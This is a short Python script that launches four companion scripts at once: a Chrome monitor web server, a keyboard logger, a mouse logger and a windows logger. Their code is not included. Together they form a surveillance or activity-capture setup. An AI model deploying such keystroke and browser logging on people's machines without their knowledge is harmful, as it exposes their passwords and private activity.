import subprocess

def run_script(script_path):
    subprocess.Popen(["python", script_path])

if __name__ == "__main__":

    scripts = ["chrome_monitor-webserver.py", "keyboard_logger.py", "mouse_logger.py", "windows_logger.py"]
    
    for script in scripts:
        run_script(script)
    
